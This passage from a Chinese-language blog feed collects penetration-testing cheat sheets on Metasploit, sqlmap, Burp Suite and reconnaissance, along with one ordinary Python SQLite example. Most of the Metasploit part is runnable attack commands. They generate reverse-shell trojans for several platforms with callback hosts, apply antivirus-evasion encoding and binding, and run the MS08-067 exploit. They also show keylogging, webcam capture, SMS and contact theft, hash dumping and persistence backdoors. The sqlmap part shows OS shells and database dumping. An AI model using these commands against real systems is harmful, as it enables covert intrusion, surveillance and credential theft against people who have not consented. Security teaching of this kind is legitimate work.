      <url>/article/pentest-metasploit-framework.html</url>
      
        <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><a href="https://webing.io/article/windows-ubuntu-metasploit.html" target="_blank" rel="noopener">https://webing.io/article/windows-ubuntu-metasploit.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">service postgresql start        启动数据库服务</span><br><span class="line">service metasploit start        启动msf服务</span><br><span class="line">msfconsole                      启动命令行版本</span><br><span class="line">db_status                       查看数据库连接状态，未连接要切换到数据库用户进行设置</span><br><span class="line">su postgres                     切换到数据库用户</span><br><span class="line">  createuser webing -P          创建用户webing</span><br><span class="line">  createdb --owner=webing msf3  创建数据库msf3，所有者是webing</span><br><span class="line">db_connect                      查看数据库连接用法</span><br><span class="line">workspace -a webing             可省略：创建工作台webing</span><br><span class="line">workspace webing                可省略：使用工作台webing</span><br></pre></td></tr></table></figure><h3 id="辅助模块"><a href="#辅助模块" class="headerlink" title="辅助模块"></a>辅助模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show auxiliary                              查看辅助模块</span><br><span class="line">search auxiliary/scanner               搜索所有scanner模块</span><br></pre></td></tr></table></figure><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search portscan                         搜索portscan模块</span><br><span class="line">use auxiliary/scanner/postscan/syn      使用该模块,用于扫描开放端口</span><br><span class="line">show options                            查看设置</span><br><span class="line">set rhost 192.168.1.1/24                设置主机</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h4 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/ssh/ssh_login                                    ssh口令猜测</span><br><span class="line">use auxiliary/scanner/mysql/mysql_login                                mysql口令猜测</span><br><span class="line">use auxiliary/scanner/postgres/postgres_login                          postgresql口令猜测</span><br><span class="line">use auxiliary/scanner/http/tomcat_mgr_login                            tomcat口令猜测</span><br><span class="line">use auxiliary/scanner/telnet/telnet_login                              telnet口令猜测</span><br><span class="line">use auxiliary/scanner/ftp/anonymos                                     FTP匿名登录</span><br><span class="line">use auxiliary/scanner/snmp/snmp_login                                  SNMP弱口令</span><br><span class="line">use auxiliary/scanner/smb/smb_login                                    samba口令猜测</span><br></pre></td></tr></table></figure><h3 id="漏洞利用模块"><a href="#漏洞利用模块" class="headerlink" title="漏洞利用模块"></a>漏洞利用模块</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">search ms08_067                                                        搜索漏洞利用模块</span><br><span class="line">use exploit/windows/smb/ms08_067_netapi                                使用该模块</span><br><span class="line">show options                                                           显示设置</span><br><span class="line">set rhost 192.168.1.1                                                  设置主机</span><br><span class="line">show targets                                                           显示攻击目标列表</span><br><span class="line">set target 71                                                          设置攻击目标</span><br><span class="line">set payload windows/meterpreter/reverse_tcp                            设置shellcode</span><br><span class="line">show options                                                           显示设置</span><br><span class="line">set lhost 192.168.1.2                                                  设置反弹主机</span><br><span class="line">run                                                                    开始攻击</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sessions -L                         查看会话</span><br><span class="line">sessions -i 1                       使用第一个会话</span><br><span class="line">help                                查看帮助</span><br><span class="line">ps                                  查看系统进程</span><br><span class="line">migrate 3389                        切换到系统进程</span><br><span class="line">run post/windows/manage/migrate     切换到随机进程</span><br><span class="line">hashdump                            获取账号密码hash</span><br><span class="line">screenshot                          截屏</span><br><span class="line">webcam_snap                         开启摄像头</span><br><span class="line">keyscan_start                       记录键盘</span><br><span class="line">keyscan_dump                        获取键盘记录</span><br></pre></td></tr></table></figure><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows:"></a>windows:</h4><p>生成木马：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=10010 X -f exe &gt;/mnt/d/Frank/Desktop/lol.exe</span><br></pre></td></tr></table></figure><p>监听端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload widnows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>可以这样监听端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x &quot;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.31.100; set LPORT 10010; run&quot;</span><br></pre></td></tr></table></figure><h4 id="linux"><a href="#linux" class="headerlink" title="linux:"></a>linux:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=118.184.40.22 LPORT=1122 X &gt; /root/linux</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x &quot;use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 118.184.40.22; set LPORT 1122; run&quot;</span><br></pre></td></tr></table></figure><h4 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=10010 R &gt; /root/webing.apk</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/mutli/handler</span><br><span class="line">set payload android/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x &quot;use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 192.168.31.100; set LPORT 10010; run&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dump_contacts        --这个是导出电话</span><br><span class="line">dump_sms             --这个是导出信息</span><br><span class="line">Webcam_list          --可以看到有几个摄像头</span><br><span class="line">-i 1                 --选择后摄像头 </span><br><span class="line">webcam_snap          --拍照</span><br><span class="line">webcam_stream        --开启摄像头</span><br></pre></td></tr></table></figure><h4 id="java"><a href="#java" class="headerlink" title="java"></a>java</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/meterpreter/reverse_tcp LHOST=118.184.40.22 LPORT=10010 X &gt;/root/123.jar</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload java/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x &quot;use exploit/multi/handler; set PAYLOAD java/meterpreter/reverse_tcp; set LHOST 118.184.40.22; set LPORT 10010; run&quot;</span><br></pre></td></tr></table></figure><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=10010 R &gt;/root/123.php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x &quot;use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp; set LHOST 192.168.1.1; set LPORT 10010; run&quot;</span><br></pre></td></tr></table></figure><h4 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -f raw -e x86/jmp_call_additive LHOST=192.168.1.1 LPORT=1120 | msfvenom -e x86/shikata_ga_nai -a x86 -platform windows -f exe &gt; /root/meter.exe</span><br><span class="line">upx -9 meter.exe</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b ‘\x00’lhost=server.ngrok.cc lport=11206 -f exe &gt; haya.exe</span><br></pre></td></tr></table></figure><h3 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a>shellter</h3><p>免杀工具，还不错，测试能过360。</p><p>绑定程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellter           启动</span><br><span class="line">A                  自动模式</span><br><span class="line">/root/webing.exe   选择需要绑定的文件</span><br><span class="line">L                  列表，选择序号</span><br><span class="line">SET LHOST          设置反弹地址</span><br><span class="line">SET LPORT          设置端口</span><br></pre></td></tr></table></figure><p>设置监听：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x &quot;use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.31.100; set LPORT 10010; run&quot;</span><br></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>不同账户可通过脚本进行提权，查看所有提权模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search exploit/windows/local</span><br></pre></td></tr></table></figure><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>Windows：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run persistence -X -i 5 -p 1120 -r 192.168.1.1  写入注册表 每50秒自动反弹连接</span><br></pre></td></tr></table></figure><p>WEB:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run metsvc -A                       安装后门</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/metsvc_bind_tcp</span><br><span class="line">show options                        查看设置</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-Sqlmap</title>
      <link href="/article/pentest-sqlmap.html"/>
      <url>/article/pentest-sqlmap.html</url>
      
        <content type="html"><![CDATA[<h3 id="请求延迟"><a href="#请求延迟" class="headerlink" title="请求延迟"></a>请求延迟</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;注入点&quot; --delay 1       请求延迟1秒</span><br></pre></td></tr></table></figure><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;注入点&quot; --file-read &quot;绝对路径&quot;                                  读文件</span><br><span class="line">sqlmap.py -u &quot;注入点&quot; --file-write=&quot;本地路径文件&quot; --file-dest=&quot;服务器路径&quot;     写入文件</span><br><span class="line">sqlmap.py -u &quot;注入点&quot; --os-shell                                             系统交互shell</span><br><span class="line">sqlmap.py -u &quot;注入点&quot; --sql-shell                                            数据库交互</span><br><span class="line">sqlmap.py -u &quot;注入点&quot; --os-cmd=whoami                                        执行系统命令</span><br></pre></td></tr></table></figure><h3 id="access数据库的注入"><a href="#access数据库的注入" class="headerlink" title="access数据库的注入"></a>access数据库的注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;连接&quot; --tables                   列表名</span><br><span class="line">sqlmap -u &quot;连接&quot; --common-tables            直接爆破表名</span><br><span class="line">sqlmap -u &quot;连接&quot; -T 表名 --common-columns    爆列名</span><br><span class="line">sqlmap -u &quot;连接&quot; -T 表名 -C 列名 --dump      爆数据</span><br></pre></td></tr></table></figure><h3 id="其他数据库注入"><a href="#其他数据库注入" class="headerlink" title="其他数据库注入"></a>其他数据库注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;连接&quot;  --is-dba                               查看是不是管理员权限</span><br><span class="line">sqlmap -u &quot;连接&quot;  --current-user                         当前数据库用户</span><br><span class="line">sqlmap -u &quot;连接&quot;  --dbs                                  所有数据库</span><br><span class="line">sqlmap -u &quot;连接&quot;  --current-db                           查看当前的数据库</span><br><span class="line">sqlmap -u &quot;连接&quot;  -D 数据库名称 --tables                  列表名 </span><br><span class="line">sqlmap -u &quot;连接&quot;  -D 数据库名称 -T 表名 --columns         列出表中的列名</span><br><span class="line">sqlmap -u &quot;连接&quot;  -D 数据库名称 -T 表名 -C 列名 --dump    列出账号密码</span><br><span class="line">sqlmap -u &quot;连接&quot;  --dbms=mysql、oracle、mssql             指定数据库</span><br><span class="line"></span><br><span class="line">--users             所有数据库用户</span><br><span class="line">--passwords         枚举数据库所有用户密码</span><br><span class="line">--roles             列出数据库管理员角色</span><br><span class="line">--privileges        列出数据库管理员权限</span><br><span class="line">--current-user      当前数据库用户</span><br><span class="line">--tables            参数:列表名</span><br><span class="line">--columns           参数:列字段</span><br><span class="line">--dump-all          参数:下载数据</span><br><span class="line">--dump              获取表中的数据</span><br><span class="line">--level             测试等级1-5,默认是1</span><br><span class="line">sqlmap -u &quot;连接&quot;  --schema --batch --exclude-sysdbs      列举数据库系统的架构</span><br></pre></td></tr></table></figure><h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;注入的页面&quot; --cookie &quot;id=**&quot; --level 2</span><br></pre></td></tr></table></figure><h3 id="表单注入"><a href="#表单注入" class="headerlink" title="表单注入"></a>表单注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;注入的页面&quot; --form</span><br><span class="line">sqlmap -u &quot;注入的页面&quot; --data &quot;获取的表单&quot;</span><br></pre></td></tr></table></figure><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;连接&quot; --tamper=unmagicquotes.py --risk 3 -v 3</span><br></pre></td></tr></table></figure><h3 id="伪静态注入"><a href="#伪静态注入" class="headerlink" title="伪静态注入"></a>伪静态注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap：在点HTML前边加*号进行注入</span><br></pre></td></tr></table></figure><h3 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">常见于ID=base64码</span><br><span class="line">sqlmap.py -u &quot;base64码链接&quot; --tamper=base64encode.py</span><br></pre></td></tr></table></figure><h3 id="测试等级"><a href="#测试等级" class="headerlink" title="测试等级"></a>测试等级</h3><p>-V     显示调试信息   共七个等级<br> 0     只显示Python错误以及严重的信息<br> 1     同时显示基本信息和警告信息<br> 2     同时显示debug信息<br> 3     同时显示注入的payload<br> 4     同时显示http请求<br> 5     同时显示http响应头<br> 6     同时显示http相应页面</p><p>–level      五个风险等级<br>       1     默认<br>       2 3   HTTP Cookie 测试</p><p>–risk       四个风险等级<br>       1     测试大部分的测试语句<br>       2     增加基于事件测试语句<br>       3     增加OR语句的SQL测试语句</p><p>–level 5 –risk 4 最大测试等级</p><p>sqlmap -m   详细路径 指定URL列表进行批量扫注入<br>sqlmap -r   抓包的文件cookie 登录框post 搜索框 等注入<br>sqlmap -g   用谷歌批量扫描<br>sqlmap -p   指定注入的参数，如user、password等。</p><p>数据导出：–dump-all<br>          -D 数据库名 -T 表 –dump-all<br>          –dump-all 所有数据库</p><p>–threads    采用多线程(–threads 3)<br>–sql-query  执行指定的sql语句(–sql-query “select * from ip;” )</p><h3 id="指定注入方式"><a href="#指定注入方式" class="headerlink" title="指定注入方式"></a>指定注入方式</h3><p>– technique “B”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">B: Boolean-based blind SQL injection 布尔型注入</span><br><span class="line">E: Error-based SQL injection         报错型注入</span><br><span class="line">U: UNION query SQL injection         可联合查询注入</span><br><span class="line">S: Stacked queries SQL injection     可语句查询注入</span><br><span class="line">T: Time-based blind SQL injection    基于多时间延迟注入</span><br></pre></td></tr></table></figure><h3 id="DNS查询注入"><a href="#DNS查询注入" class="headerlink" title="DNS查询注入"></a>DNS查询注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--dns-domain=&quot;baidu.com&quot;</span><br></pre></td></tr></table></figure><h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--start 1 --stop 3                   获取前三条数据</span><br><span class="line">--prefix &quot;select&quot; --suffix &quot;--dbs&quot;   在注入语句的前边和后边添加语句</span><br></pre></td></tr></table></figure><h3 id="乌云"><a href="#乌云" class="headerlink" title="乌云"></a>乌云</h3>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-BurpSuite</title>
      <link href="/article/pentest-burpsuite.html"/>
      <url>/article/pentest-burpsuite.html</url>
      
        <content type="html"><![CDATA[<h3 id="重置功能"><a href="#重置功能" class="headerlink" title="重置功能"></a>重置功能</h3><p><img src="../do/images/pentest/pentest-burpsuite01.gif" alt></p><h3 id="字体与编码"><a href="#字体与编码" class="headerlink" title="字体与编码"></a>字体与编码</h3><p><img src="../do/images/pentest/pentest-burpsuite02.gif" alt></p><h3 id="设置监听端口"><a href="#设置监听端口" class="headerlink" title="设置监听端口"></a>设置监听端口</h3><p><img src="../do/images/pentest/pentest-burpsuite03.gif" alt></p><h3 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h3><p><img src="../do/images/pentest/pentest-burpsuite04.gif" alt></p><h3 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h3><p>Scan可以进行爬虫、漏洞扫描</p><p><img src="../do/images/pentest/pentest-burpsuite05.gif" alt></p><h3 id="Intruder"><a href="#Intruder" class="headerlink" title="Intruder"></a>Intruder</h3><p>Intruder有四种攻击模式：<br>Sniper : 对设置的变量依次进行破解，如：加载了一个密码字典，会把密码字典的所有内容依次进行爆破。<br>Battering ram : 对设置的变量进行同时破解，如：设置了两个变量，一个密码字典，变量1是admin，变量2也是admin，这两个变量会同时把密码字典的所有内容依次进行爆破。<br>pitch fork : 设置的变量将会对应一个字典，第一个字典的第一行对应第二个字典的第一行。<br>Cluster bomb : 每个变量将会对应一个字典，并且交集破解尝试每一个组合。也就是第一个字典的第一行会对应第二个字典的所有内容，然后第一个字典的第二行会对应第二个字典的所有内容，依次爆破。</p><p>配置信息：<br>Request Engine 请求设置，可设置线程，超时等信息。<br>Attack Results 攻击结果显示 ,可设置request,response等<br>Grep - Match 识别response中是否存在此表达式，或者简单字符串<br>Grep - Extract 通过正则表达式获取response中的信息。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python SQLite数据库操作</title>
      <link href="/article/database-sqlite.html"/>
      <url>/article/database-sqlite.html</url>
      
        <content type="html"><![CDATA[<h3 id="登录、创建、插入、删除"><a href="#登录、创建、插入、删除" class="headerlink" title="登录、创建、插入、删除"></a>登录、创建、插入、删除</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"># 导入SQLite驱动:</span><br><span class="line">import sqlite3</span><br><span class="line"># 连接到SQLite数据库</span><br><span class="line"># 数据库文件是test.db</span><br><span class="line"># 如果文件不存在，会自动在当前目录创建:</span><br><span class="line">conn = sqlite3.connect(&apos;test.db&apos;)</span><br><span class="line"># 创建一个Cursor:</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line"># 执行一条SQL语句，创建各种表，设置未自增型:</span><br><span class="line">create_sql = [&apos;create table ip (id INTEGER PRIMARY KEY NOT NULL, ip varchar(20))&apos;,</span><br><span class="line">&apos;create table port (id INTEGER PRIMARY KEY NOT NULL, ip varchar(20), port varchar(20))&apos;,</span><br><span class="line">&apos;create table site (id INTEGER PRIMARY KEY NOT NULL, ip varchar(20), port varchar(20), url varchar(100))&apos;</span><br><span class="line">]</span><br><span class="line">for sql in create_sql:</span><br><span class="line">    cursor.execute(sql)</span><br><span class="line"># 继续执行一条SQL语句，插入一条记录:</span><br><span class="line">cursor.execute(&apos;insert into ip (ip) values (&quot;192.168.1.1&quot;)&apos;)</span><br><span class="line">cursor.execute(&apos;insert into ip (ip) values (&quot;192.168.1.2&quot;)&apos;)</span><br><span class="line"># 取最新的第十条数据</span><br><span class="line">cursor.execute(&quot;select * from ip limit ((select count(id) from ip)-10),10&quot;)</span><br><span class="line"># 查询所有数据</span><br><span class="line">cursor.execute(&apos;select * from ip&apos;)</span><br><span class="line"># 只保留最新的10条数据</span><br><span class="line"># cursor.execute(&quot;delete from [ip] where (select count([id]) from [ip])&gt; 10 and [id] in (select [id] from [ip] order by [id(按照id字段降序)] desc limit (select count([id]) from [ip]) offset 10 )&quot;)</span><br><span class="line">cursor.execute(&quot;delete from ip where (select count(id) from ip)&gt; 10 and id in (select id from ip order by id desc limit (select count(id) from ip) offset 10 )&quot;)</span><br><span class="line">values = cursor.fetchall()</span><br><span class="line">print(values)</span><br><span class="line"># 通过rowcount获得插入的行数:</span><br><span class="line">cursor.rowcount</span><br><span class="line"># 关闭Cursor:</span><br><span class="line">cursor.close()</span><br><span class="line"># 提交事务:</span><br><span class="line">conn.commit()</span><br><span class="line"># 关闭Connection:</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-逻辑漏洞</title>
      <link href="/article/pentest-logic-flaw.html"/>
      <url>/article/pentest-logic-flaw.html</url>
      
        <content type="html"><![CDATA[<h3 id="设计缺陷-逻辑错误"><a href="#设计缺陷-逻辑错误" class="headerlink" title="设计缺陷-逻辑错误"></a>设计缺陷-逻辑错误</h3><ul><li>密码重置漏洞</li><li>提现漏洞</li><li>验证码漏洞</li><li>未授权访问（操作）漏洞</li><li>越权</li></ul><p>巴拉巴拉的，反正没图。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-信息收集</title>
      <link href="/article/pentest-info.html"/>
      <url>/article/pentest-info.html</url>
      
        <content type="html"><![CDATA[<h3 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h3><table><thead><tr><th align="center">IP地址</th><th align="center">子网掩码</th></tr></thead><tbody><tr><td align="center">site:baidu.com</td><td align="center">用于收集子域名</td></tr><tr><td align="center">intitle:管理登录 filetype:php</td><td align="center">标题中带有管理登录并且还是PHP语言的</td></tr><tr><td align="center">inurl:login.php</td><td align="center">包含login.php的url</td></tr><tr><td align="center">intext:卡号</td><td align="center">正文中存在关键字的页面</td></tr><tr><td align="center">intitle:登录</td><td align="center">标题中存在的关键字网页</td></tr><tr><td align="center">info</td><td align="center">一些基本信息</td></tr><tr><td align="center">inurl</td><td align="center">URL存在关键字的网页</td></tr><tr><td align="center">filetype:</td><td align="center">搜索指定文件类型</td></tr></tbody></table><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>暴露了一些敏感信息，可提供渗透思路或者方式的，就是信息泄露。</p><h3 id="网站路径"><a href="#网站路径" class="headerlink" title="网站路径"></a>网站路径</h3><ul><li>首先要判断是个人开发的还是开源的CMS源码、购买的CMS源码</li><li>使用常见的指纹库进行识别</li></ul><h3 id="域传送"><a href="#域传送" class="headerlink" title="域传送"></a>域传送</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">set type=ns</span><br><span class="line">github.io</span><br><span class="line">server ns3.p16.dynect.net</span><br><span class="line">ls -d github.io</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-序列化与反序列化</title>
      <link href="/article/pentest-serialization.html"/>
      <url>/article/pentest-serialization.html</url>
      
